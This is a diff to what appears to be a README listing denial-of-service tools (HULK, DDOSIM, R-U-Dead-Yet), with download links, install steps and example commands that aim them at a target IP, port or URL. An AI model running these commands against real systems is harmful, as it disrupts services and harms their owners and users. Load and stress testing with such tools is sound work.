@@ -31,7 +31,9 @@
     $ hulk -site http://example.com/test/ 2>/dev/null
     
 #### - [DDOSIM](https://sourceforge.net/projects/ddosim/)
+    
     Download file from https://sourceforge.net/projects/ddosim/
+    
     To install:
     $ tar -xzf ddosim-0.x.tar.gz
     $ cd ddosim-0.x
@@ -40,5 +42,17 @@
     $ make install
     
     To run (example):
-    $ ./ddosim -d 192.168.0.1 -p 80
-    $ ./ddosim -k NETWORK_ADDRESS - p 80        
+    $ ./ddosim -d <TARGET_IP> -p <TARGET_PORT>
+    $ ./ddosim -k <NETWORK_ADDRESS> - p <TARGET_PORT>
+    
+#### - [R-U-dead-yet](https://sourceforge.net/projects/r-u-dead-yet/)
+
+    Download file from https://sourceforge.net/projects/r-u-dead-yet/
+    
+    To install:
+    $ unzip R-U-Dead-Yet.zip
+    $ tar -xzf r-u-dead-yet-v2.2.tar.gz
+    
+    To run (example):
+    $ cd rudy
+    $ r-u-dead-yet-v2.2.py <TARGET_URL>
